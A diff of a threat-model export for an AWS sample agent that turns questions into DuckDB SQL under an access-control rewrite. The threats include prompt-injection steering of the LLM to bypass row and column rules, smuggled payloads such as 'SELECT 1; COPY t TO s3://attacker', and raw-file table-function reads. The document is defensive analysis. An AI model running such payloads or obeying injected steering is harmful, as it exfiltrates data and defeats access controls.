@@ -1,1890 +1,2048 @@
 {
-  "schema": 1,
-  "applicationInfo": {
-    "name": "Threat Model Export",
-    "description": "Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance)."
+ "schema": 1,
+ "applicationInfo": {
+  "name": "Threat Model Export",
+  "description": "Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).\n\nCode validation re-run 2026-09-03 against the merged code: two complete authorization bypasses (T001 shadowing, T017 opaque statements), one identity-source escalation (T018) and two fail-open defaults (T011) were found and fixed; see docs/design.md."
+ },
+ "architecture": {
+  "description": ""
+ },
+ "dataflow": {
+  "description": ""
+ },
+ "assumptions": [
+  {
+   "id": "A006",
+   "numericId": 6,
+   "content": "AWS-managed services (AgentCore Runtime + JWT authorizer, Cognito, Bedrock, S3, Secrets Manager, CloudWatch) operate correctly per the shared-responsibility model.",
+   "displayOrder": 6,
+   "metadata": []
   },
-  "architecture": {
-    "description": ""
+  {
+   "id": "A007",
+   "numericId": 7,
+   "content": "The operator/deployer owns the account, the data, the governance policy content, and the Cognito user lifecycle (including rotating the documented demo passwords before any shared exposure).",
+   "displayOrder": 7,
+   "metadata": []
   },
-  "dataflow": {
-    "description": ""
+  {
+   "id": "A008",
+   "numericId": 8,
+   "content": "Sample data is public (aws-public-blockchain, public OFAC list) or synthetic (cex_deposit_labels incl. the subject_identity column); no real customer or personal data ships with the sample.",
+   "displayOrder": 8,
+   "metadata": []
   },
-  "assumptions": [
-    {
-      "id": "A006",
-      "numericId": 6,
-      "content": "AWS-managed services (AgentCore Runtime + JWT authorizer, Cognito, Bedrock, S3, Secrets Manager, CloudWatch) operate correctly per the shared-responsibility model.",
-      "displayOrder": 6,
-      "metadata": []
-    },
-    {
-      "id": "A007",
-      "numericId": 7,
-      "content": "The operator/deployer owns the account, the data, the governance policy content, and the Cognito user lifecycle (including rotating the documented demo passwords before any shared exposure).",
-      "displayOrder": 7,
-      "metadata": []
-    },
-    {
-      "id": "A008",
-      "numericId": 8,
-      "content": "Sample data is public (aws-public-blockchain, public OFAC list) or synthetic (cex_deposit_labels incl. the subject_identity column); no real customer or personal data ships with the sample.",
-      "displayOrder": 8,
-      "metadata": []
-    },
-    {
-      "id": "A009",
-      "numericId": 9,
-      "content": "One session = one microVM = one principal (the AgentCore execution model).",
-      "displayOrder": 9,
-      "metadata": []
-    },
-    {
-      "id": "A010",
-      "numericId": 10,
-      "content": "The SigV4 payload/header identity-assertion path exists for local/CLI development only; the deployed reference configuration uses the Cognito JWT authorizer.",
-      "displayOrder": 10,
-      "metadata": []
-    }
-  ],
-  "mitigations": [
-    {
-      "id": "M001",
-      "numericId": 1,
-      "status": "mitigationResolved",
-      "content": "Governance rewrite operates on the parsed AST, not string matching: every reference to a governed logical table - via raw view, s3t.*, glue.* or dl.* alias - is replaced by a guarded subquery (RLS predicate + schema-aware CLS EXCLUDE); CTE/CTAS-local names skipped; alias semantics preserved in joins. Explicit selection of a denied column is rejected pre-engine with a legible policy error naming the column and role (never an opaque binder error).",
-      "displayOrder": 1,
-      "metadata": []
-    },
-    {
-      "id": "M002",
-      "numericId": 2,
-      "status": "mitigationResolved",
-      "content": "Fail-closed on parse failure: SQL that sqlglot cannot parse is REJECTED for restricted principals (ValueError), never passed through. Unrestricted principals (allow_raw_paths + no governed tables) bypass rewrite by explicit policy only.",
-      "displayOrder": 2,
-      "metadata": []
-    },
-    {
-      "id": "M003",
-      "numericId": 3,
-      "status": "mitigationResolved",
-      "content": "Single-statement rule: the gate requires EXACTLY ONE statement per run_sql call, split with duckdb.extract_statements - the engine's own parser, so there is no lexer divergence to aim at; semicolons inside literals/comments/dollar-quotes handled for free. Closes the multi-statement smuggling fail-open (a write riding behind a read).",
-      "displayOrder": 3,
-      "metadata": []
-    },
-    {
-      "id": "M004",
-      "numericId": 4,
-      "status": "mitigationResolved",
-      "content": "Read-only statement gate: leading-comment stripping then keyword allowlist (read statements + CREATE TEMP TABLE/VIEW); rejects INSERT/UPDATE/DELETE/non-temp CREATE/ATTACH/COPY TO. DuckDB catalog legs attach READ_ONLY; engine is in-memory and dies with the session; execution role has no write permissions on data buckets - three independent layers against persistence/exfiltration.",
-      "displayOrder": 4,
-      "metadata": []
-    },
-    {
-      "id": "M005",
-      "numericId": 5,
-      "status": "mitigationResolved",
-      "content": "Raw file access governed by an ALLOWLIST on AST shape, not a function-name denylist: every FROM/JOIN source must be an exp.Identifier (a real table/view/CTE/temp reference); table-valued functions are rejected with the offending name, with a minimal justified exception list for pure generators (GenerateSeries). Closes the parquet_scan/read_csv_auto/read_json bypass and is future-proof against new DuckDB file functions.",
-      "displayOrder": 5,
-      "metadata": []
-    },
-    {
-      "id": "M006",
-      "numericId": 6,
-      "status": "mitigationResolved",
-      "content": "Unknown-role fallback fails CLOSED: an unknown role inside a known tenant resolves to that tenant's MOST restricted policy, ranked by policy content (raw-path denial > governed-table count > row filters > denied columns) over sorted keys - never by declaration order. Unknown tenants get the configured default role.",
-      "displayOrder": 6,
-      "metadata": []
-    },
-    {
-      "id": "M007",
-      "numericId": 7,
-      "status": "mitigationResolved",
-      "content": "Inbound AuthN enforced by the platform before agent code: Amazon Cognito user pool issues ID tokens (custom:tenant/custom:role); the AgentCore managed customJWTAuthorizer validates signature (discovery URL) and allowedAudience; requestHeaderAllowlist forwards only Authorization. Verified live: no-token=401, forged-token=403, both pre-code. The sample's jwt.decode(verify_signature=False) is claims EXTRACTION from an already-verified token.",
-      "displayOrder": 7,
-      "metadata": []
-    },
-    {
-      "id": "M008",
-      "numericId": 8,
-      "status": "mitigationResolved",
-      "content": "Session blast-radius isolation: one session = one microVM = one DuckDB; a pathological query OOMs only its own session. Resource envelope (DUCKDB_MEMORY_LIMIT + spill directory) turns memory exhaustion into slower-not-dead. Bedrock/S3 cost exposure bounded by the customer's own account throttles.",
-      "displayOrder": 8,
-      "metadata": []
-    },
-    {
-      "id": "M009",
-      "numericId": 9,
-      "status": "mitigationResolved",
-      "content": "run_sql serialization under _conn_lock: execute+fetch pairs are atomic on the shared connection; the governance schema probe takes the same lock. Regression test covers parallel tool calls not stealing each other's results.",
-      "displayOrder": 9,
-      "metadata": []
-    },
-    {
-      "id": "M010",
-      "numericId": 10,
-      "status": "mitigationResolved",
-      "content": "Schema-aware CLS fails closed: EXCLUDE lists are intersected with a DESCRIBE-probed schema per reference; if the probe FAILS the full denylist is kept (worst case the engine rejects the query). The probe cache lives in one session = one principal = one microVM, so cross-principal poisoning is structurally impossible in the intended deployment.",
-      "displayOrder": 10,
-      "metadata": []
-    },
-    {
-      "id": "M011",
-      "numericId": 11,
-      "status": "mitigationResolved",
-      "content": "Observability of governance decisions: every run_sql result carries a governed flag and engine metrics; the SSE trace labels each decision (which row filter, which hidden column, or the policy rejection); runtime logs to CloudWatch. Gives operators an audit signal for whether and how the rewrite applied.",
-      "displayOrder": 11,
-      "metadata": []
-    },
-    {
-      "id": "M012",
-      "numericId": 12,
-      "status": "mitigationResolved",
-      "content": "DOCUMENTATION: deployment warnings that (a) without the inbound JWT authorizer, JWT claims are NOT verified and SigV4 identity-assertion paths trust the caller completely - production deployments must treat calling-application identity assertion as a privileged operation; (b) the module-level active-role slot is valid ONLY under one-session-one-principal (AgentCore microVM) and must not be lifted into multi-principal services; (c) demo Cognito users ship with a documented password - rotate credentials and restrict the user pool before exposing a deployment.",
-      "displayOrder": 12,
-      "metadata": []
-    },
-    {
-      "id": "M013",
-      "numericId": 13,
-      "status": "mitigationInProgress",
-      "content": "Policy-as-configuration with fail-safe default: GOVERNANCE_POLICIES is JSON env config; unknown principals resolve to the tenant's most restricted policy or the configured default role. RECOMMENDED HARDENING (documentation): ship the default-role example as a restricted policy and validate policy JSON at startup (reject unknown keys / empty-tables-with-allow_raw_paths combinations).",
-      "displayOrder": 13,
-      "metadata": []
-    },
-    {
-      "id": "M014",
-      "numericId": 14,
-      "status": "mitigationResolvedWillNotAction",
-      "content": "Residual acceptance for inference/side channels: aggregate-inference and timing side channels against denied columns are NOT fully closed by any query-rewrite RLS/CLS implementation (industry-wide limitation, same class as BI-tool row-level security). Sample carries a not-for-production disclaimer; production guidance is physical separation (per-tenant tables/views) when denied data is high-sensitivity.",
-      "displayOrder": 14,
-      "metadata": []
-    },
-    {
-      "id": "M015",
-      "numericId": 15,
-      "status": "mitigationResolved",
-      "content": "Trace transparency is deliberate and bounded: the SSE trace exposes the principal's OWN policy application (their row filter, their denied columns) - the exact information the clean rejection message already conveys - and never another tenant's policy or data. For deployments preferring opacity, the entrypoint envelope mapping is a single filter point to drop rls[]/cls[] details from the stream.",
-      "displayOrder": 15,
-      "metadata": []
-    },
-    {
-      "id": "M016",
-      "numericId": 16,
-      "status": "mitigationResolved",
-      "content": "UI credential hygiene: the app client secret enters the UI only via environment variable (never the repo; detect-secrets gate in CI); tokens live in Streamlit session state in-process; persona switching is logout/login so identity is always a validated JWT claim, not a UI toggle.",
-      "displayOrder": 16,
-      "metadata": []
-    }
-  ],
-  "assumptionLinks": [],
-  "mitigationLinks": [
-    {
-      "linkedId": "T001",
-      "mitigationId": "M001"
-    },
-    {
-      "linkedId": "T001",
-      "mitigationId": "M002"
-    },
-    {
-      "linkedId": "T001",
-      "mitigationId": "M005"
-    },
-    {
-      "linkedId": "T001",
-      "mitigationId": "M011"
-    },
-    {
-      "linkedId": "T002",
-      "mitigationId": "M002"
-    },
-    {
-      "linkedId": "T002",
-      "mitigationId": "M001"
-    },
-    {
-      "linkedId": "T003",
-      "mitigationId": "M003"
-    },
-    {
-      "linkedId": "T003",
-      "mitigationId": "M004"
-    },
-    {
-      "linkedId": "T004",
-      "mitigationId": "M005"
-    },
-    {
-      "linkedId": "T004",
-      "mitigationId": "M004"
-    },
-    {
-      "linkedId": "T005",
-      "mitigationId": "M006"
-    },
-    {
-      "linkedId": "T005",
-      "mitigationId": "M013"
-    },
-    {
-      "linkedId": "T006",
-      "mitigationId": "M007"
-    },
-    {
-      "linkedId": "T007",
-      "mitigationId": "M007"
-    },
-    {
-      "linkedId": "T007",
-      "mitigationId": "M012"
-    },
-    {
-      "linkedId": "T008",
-      "mitigationId": "M016"
-    },
-    {
-      "linkedId": "T008",
-      "mitigationId": "M012"
-    },
-    {
-      "linkedId": "T009",
-      "mitigationId": "M014"
-    },
-    {
-      "linkedId": "T009",
-      "mitigationId": "M001"
-    },
-    {
-      "linkedId": "T010",
-      "mitigationId": "M008"
-    },
-    {
-      "linkedId": "T011",
-      "mitigationId": "M013"
-    },
-    {
-      "linkedId": "T011",
-      "mitigationId": "M011"
-    },
-    {
-      "linkedId": "T012",
-      "mitigationId": "M010"
-    },
-    {
-      "linkedId": "T013",
-      "mitigationId": "M004"
-    },
-    {
-      "linkedId": "T013",
-      "mitigationId": "M003"
-    },
-    {
-      "linkedId": "T014",
-      "mitigationId": "M009"
-    },
-    {
-      "linkedId": "T015",
-      "mitigationId": "M012"
-    },
-    {
-      "linkedId": "T016",
-      "mitigationId": "M015"
-    },
-    {
-      "linkedId": "T016",
-      "mitigationId": "M011"
-    }
-  ],
-  "threats": [
-    {
-      "id": "T001",
-      "numericId": 1,
-      "threatSource": "Restricted end user (authenticated, low privilege)",
-      "prerequisites": "Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions",
-      "threatAction": "Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns",
-      "threatImpact": "Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Restricted end user (authenticated, low privilege) Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions can Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns, which leads to Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer",
-      "displayOrder": 1,
-      "status": "threatResolved",
-      "tags": [
-        "prompt-injection",
-        "authz-bypass",
-        "core-threat"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T002",
-      "numericId": 2,
-      "threatSource": "Restricted end user via LLM prompt injection",
-      "prerequisites": "Same as above; knowledge that an embedded engine executes generated SQL",
-      "threatAction": "Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified",
-      "threatImpact": "Ungoverned statement reaches the engine - RLS/CLS bypass",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Restricted end user via LLM prompt injection Same as above; knowledge that an embedded engine executes generated SQL can Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified, which leads to Ungoverned statement reaches the engine - RLS/CLS bypass",
-      "displayOrder": 2,
-      "status": "threatResolved",
-      "tags": [
-        "parser-divergence",
-        "fail-closed"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T003",
-      "numericId": 3,
-      "threatSource": "Restricted end user via LLM prompt injection",
-      "prerequisites": "Valid restricted session; gate classifies on the leading keyword",
-      "threatAction": "Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement",
-      "threatImpact": "Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001",
-        "A005"
-      ],
-      "statement": "A Restricted end user via LLM prompt injection Valid restricted session; gate classifies on the leading keyword can Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement, which leads to Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate",
-      "displayOrder": 3,
-      "status": "threatResolved",
-      "tags": [
-        "multi-statement",
-        "write-gate",
-        "phase-7.5-fix"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T004",
-      "numericId": 4,
-      "threatSource": "Restricted end user via LLM prompt injection",
-      "prerequisites": "Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release",
-      "threatAction": "Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every",
-      "threatImpact": "Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Restricted end user via LLM prompt injection Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release can Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every, which leads to Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass",
-      "displayOrder": 4,
-      "status": "threatResolved",
-      "tags": [
-        "raw-path",
-        "allowlist",
-        "phase-7.5-fix"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T005",
-      "numericId": 5,
-      "threatSource": "Restricted end user presenting an unknown role",
-      "prerequisites": "Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies",
-      "threatAction": "Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical",
-      "threatImpact": "Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001",
-        "A004"
-      ],
-      "statement": "A Restricted end user presenting an unknown role Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies can Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical, which leads to Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed",
-      "displayOrder": 5,
-      "status": "threatResolved",
-      "tags": [
-        "role-fallback",
-        "order-dependence",
-        "phase-7.5-fix"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T006",
-      "numericId": 6,
-      "threatSource": "External attacker at the runtime endpoint",
-      "prerequisites": "Network reach to the public AgentCore runtime endpoint; no valid Cognito token",
-      "threatAction": "Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client",
-      "threatImpact": "Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A002"
-      ],
-      "statement": "A External attacker at the runtime endpoint Network reach to the public AgentCore runtime endpoint; no valid Cognito token can Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client, which leads to Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn",
-      "displayOrder": 6,
-      "status": "threatResolved",
-      "tags": [
-        "authn",
-        "jwt",
-        "cognito"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T007",
-      "numericId": 7,
-      "threatSource": "Malicious or compromised calling application (SigV4 path)",
-      "prerequisites": "IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity",
-      "threatAction": "Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy",
-      "threatImpact": "Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A002"
-      ],
-      "statement": "A Malicious or compromised calling application (SigV4 path) IAM permission to invoke the runtime on a deployment WITHOUT the JWT authorizer (local/CLI form); governance relies on caller-asserted identity can Asserts an arbitrary tenant:role in the runtime user-id header or payload identity object (e.g. ops:admin) to obtain an unrestricted policy, which leads to Full dataset visibility for any principal the caller invents - authorization is only as strong as the weakest accepted identity source",
-      "displayOrder": 7,
-      "status": "threatResolved",
-      "tags": [
-        "identity-assertion",
-        "trust-assumption"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T008",
-      "numericId": 8,
-      "threatSource": "Attacker with access to the analyst's machine or environment",
-      "prerequisites": "The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password",
-      "threatAction": "Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to",
-      "threatImpact": "Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A002",
-        "A003"
-      ],
-      "statement": "A Attacker with access to the analyst's machine or environment The Streamlit UI holds the Cognito ID token in session state and the app client secret in a process env var; demo users ship with a documented password can Steals the bearer token (valid up to its expiry) or the client secret + a user password from the UI host; or logs into a deployed demo with the documented default credentials the operator failed to, which leads to Principal impersonation for the token lifetime; with a stolen investigator identity, access to that tenant's full policy window incl. subject_identity",
-      "displayOrder": 8,
-      "status": "threatResolved",
-      "tags": [
-        "ui",
-        "token-theft",
-        "default-credentials"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T009",
-      "numericId": 9,
-      "threatSource": "Restricted end user",
-      "prerequisites": "Valid restricted session; CLS policy denies a column (subject_identity)",
-      "threatAction": "Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing",
-      "threatImpact": "Partial disclosure of denied-column information without direct selection",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Restricted end user Valid restricted session; CLS policy denies a column (subject_identity) can Infers denied-column values via side channels the rewrite does not remove: error messages, aggregate predicates on permitted expressions, or timing, which leads to Partial disclosure of denied-column information without direct selection",
-      "displayOrder": 9,
-      "status": "threatResolved",
-      "tags": [
-        "side-channel",
-        "inference"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T010",
-      "numericId": 10,
-      "threatSource": "Restricted end user",
-      "prerequisites": "Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming",
-      "threatAction": "Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions",
-      "threatImpact": "Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs",
-      "impactedGoal": [],
-      "impactedAssets": [],
-      "statement": "A Restricted end user Valid session; engine executes governed but expensive SQL; SSE keeps the session streaming can Asks questions that generate pathological SQL (full-history globs, huge sorts, cross joins) to exhaust the session's memory/CPU, or holds many concurrent streaming sessions, which leads to Own-session OOM/slowdown only - one session = one microVM; no shared-service blast radius. Repeated invocations still incur S3 request and Bedrock token costs",
-      "displayOrder": 10,
-      "status": "threatResolved",
-      "tags": [
-        "resource-exhaustion",
-        "cost"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T011",
-      "numericId": 11,
-      "threatSource": "Operator error (customer deployer)",
-      "prerequisites": "Operator writes GOVERNANCE_POLICIES JSON by hand",
-      "threatAction": "Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended",
-      "threatImpact": "Unintended data exposure to restricted principals; worst case default role is unrestricted",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A004"
-      ],
-      "statement": "A Operator error (customer deployer) Operator writes GOVERNANCE_POLICIES JSON by hand can Ships a malformed policy (typo in tenant:role key, empty tables map with allow_raw_paths true, wrong row_filter SQL) that silently grants broader visibility than intended, which leads to Unintended data exposure to restricted principals; worst case default role is unrestricted",
-      "displayOrder": 11,
-      "status": "threatResolved",
-      "tags": [
-        "misconfiguration",
-        "policy"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T012",
-      "numericId": 12,
-      "threatSource": "Restricted end user",
-      "prerequisites": "Valid restricted session; DESCRIBE-based schema probe active for CLS intersection",
-      "threatAction": "Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink",
-      "threatImpact": "Denied columns leak through a stale or failed schema probe",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Restricted end user Valid restricted session; DESCRIBE-based schema probe active for CLS intersection can Exploits the schema-probe cache: if probe fails open or cache poisons across principals, EXCLUDE lists could shrink, which leads to Denied columns leak through a stale or failed schema probe",
-      "displayOrder": 12,
-      "status": "threatResolved",
-      "tags": [
-        "schema-probe",
-        "cache"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T013",
-      "numericId": 13,
-      "threatSource": "Any principal via agent-generated SQL",
-      "prerequisites": "Gate must block writes for the model to hold",
-      "threatAction": "Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time",
-      "threatImpact": "Data exfiltration to external targets or persistence beyond the session",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Any principal via agent-generated SQL Gate must block writes for the model to hold can Single-statement SQL attempts persistent writes (CREATE TABLE non-temp, INSERT, COPY TO s3://attacker-bucket), ATTACH of foreign databases, or extension installs at query time, which leads to Data exfiltration to external targets or persistence beyond the session",
-      "displayOrder": 13,
-      "status": "threatResolved",
-      "tags": [
-        "exfiltration",
-        "write-gate"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T014",
-      "numericId": 14,
-      "threatSource": "Concurrent tool calls within one session (Strands thread execution)",
-      "prerequisites": "LLM issues multiple run_sql calls in one message; shared DuckDB connection",
-      "threatAction": "Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution",
-      "threatImpact": "Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage",
-      "impactedGoal": [],
-      "impactedAssets": [],
-      "statement": "A Concurrent tool calls within one session (Strands thread execution) LLM issues multiple run_sql calls in one message; shared DuckDB connection can Race between execute/fetch pairs or between governance schema probe and query execution corrupts result attribution, which leads to Results attributed to the wrong query - integrity issue; in a multi-principal design (NOT this sample: one session = one principal) it would be cross-principal leakage",
-      "displayOrder": 14,
-      "status": "threatResolved",
-      "tags": [
-        "concurrency",
-        "race"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T015",
-      "numericId": 15,
-      "threatSource": "Sample consumer (customer engineer)",
-      "prerequisites": "Customer lifts governance.py into a production multi-principal service",
-      "threatAction": "Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model",
-      "threatImpact": "Cross-principal policy application: user A's query rewritten under user B's policy",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A001"
-      ],
-      "statement": "A Sample consumer (customer engineer) Customer lifts governance.py into a production multi-principal service can Reuses the module-level active-role slot in a process serving MULTIPLE principals concurrently - a design valid only under AgentCore's one-session-one-microVM model, which leads to Cross-principal policy application: user A's query rewritten under user B's policy",
-      "displayOrder": 15,
-      "status": "threatResolved",
-      "tags": [
-        "misuse-of-sample",
-        "documentation"
-      ],
-      "metadata": []
-    },
-    {
-      "id": "T016",
-      "numericId": 16,
-      "threatSource": "Restricted end user observing the streaming trace",
-      "prerequisites": "Valid restricted session; the SSE trace emits gate/govern/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[])",
-      "threatAction": "Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges",
-      "threatImpact": "Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure",
-      "impactedGoal": [],
-      "impactedAssets": [
-        "A004"
-      ],
-      "statement": "A Restricted end user observing the streaming trace Valid restricted session; the SSE trace emits gate/govern/execute envelopes incl. the rewritten SQL and policy metadata (rls[]/cls[]) can Reads the trace to learn the exact RLS predicates, denied-column names, and policy structure applied to their principal, then uses that map to probe the policy's edges, which leads to Disclosure of governance-policy internals (filter predicates, denied column names) to the governed principal - reconnaissance that sharpens bypass attempts; no direct data disclosure",
-      "displayOrder": 16,
-      "status": "threatResolved",
-      "tags": [
-        "trace",
-        "sse",
-        "policy-disclosure",
-        "new-in-v2"
-      ],
-      "metadata": []
-    }
-  ],
-  "businessContext": {
-    "description": "Open-source sample (aws-samples, MIT-0) demonstrating an on-chain investigations agent with an in-process DuckDB engine on Amazon Bedrock AgentCore. Four S3 table-access methods (raw Parquet, S3 Tables Iceberg REST, Glue federated Iceberg REST, DuckLake) behind one engine; an identity-aware row/column-level governance layer implemented as an engine-neutral SQL rewrite (sqlglot) in front of the embedded engine; inbound authentication via an Amazon Cognito user pool wired to the AgentCore managed JWT authorizer (allowedAudience validation of ID tokens carrying custom:tenant/custom:role claims); a streaming SSE entrypoint that emits the agent's per-statement gate->govern->execute trace; and a Streamlit chat UI that renders the interleaved transcript. Educational reference implementation with an explicit not-for-production disclaimer; customers deploy it into their own AWS accounts. Demo data is the public aws-public-blockchain Ethereum dataset plus a real public OFAC sanctioned-address list and a small SYNTHETIC exchange deposit-label table (synthetic customer identifiers exist solely to demonstrate column-level governance).",
-    "features": {
-      "industry_sector": "Technology",
-      "sensitivity_tier": "Public",
-      "user_base_size": "Nano",
-      "geographic_scope": "Global / Transboundary",
-      "regulatory_requirements": [
-        "None"
-      ],
-      "system_criticality": "Low",
-      "financial_impact": "Negligible",
-      "authentication_requirement": "Federated",
-      "deployment_model": "Serverless / FaaS",
-      "user_base_metric": "Installs / downloads",
-      "revenue_band": "Enterprise",
-      "geographic_profile": {
-        "data_residency": "National / Single-Country",
-        "compute_location": "National / Single-Country",
-        "user_base_location": "Global / Transboundary",
-        "organizational_headquarters": "National / Single-Country"
-      }
-    }
+  {
+   "id": "A009",
+   "numericId": 9,
+   "content": "One session = one microVM = one principal (the AgentCore execution model).",
+   "displayOrder": 9,
+   "metadata": []
   },
-  "components": [
-    {
-      "id": "C001",
-      "name": "Streamlit chat UI",
-      "type": "Compute",
-      "service_provider": "Other",
-      "specific_service": "Streamlit (local/self-hosted)",
-      "version": null,
-      "description": "Chat client: Cognito USER_PASSWORD_AUTH login (app client secret from env), sends the ID token as Bearer over raw HTTPS to the runtime, parses the SSE envelope stream, renders the interleaved reasoning+tool transcript and a Trace tab. Holds the user's ID token and the app client secret in process memory.",
-      "configuration": null
-    },
-    {
-      "id": "C002",
-      "name": "Amazon Cognito user pool",
-      "type": "Security",
-      "service_provider": "AWS",
